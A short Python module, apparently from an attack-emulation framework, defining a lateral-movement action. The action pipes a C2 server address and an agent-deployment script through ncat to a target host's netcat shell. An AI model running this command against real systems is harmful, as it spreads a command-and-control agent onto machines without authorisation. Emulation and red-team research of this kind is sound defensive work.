from ..low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.services.config_service import ConfigService


class NCLateralMove(LowLevelAction):
    ability_name = "deception-ncshell"

    def __init__(self, agent: Agent, host_ip: str, port: str):
        self.host_ip = host_ip
        self.port = port

        command = f'{{ echo "server={ConfigService().get_config().agent_c2c_server}"; cat runDeployAgent.sh; }} | ncat --no-shutdown -i 5s {host_ip} {port}'
        payloads = ["runDeployAgent.sh"]

        super().__init__(agent, command, payloads=payloads, command_delay=3)
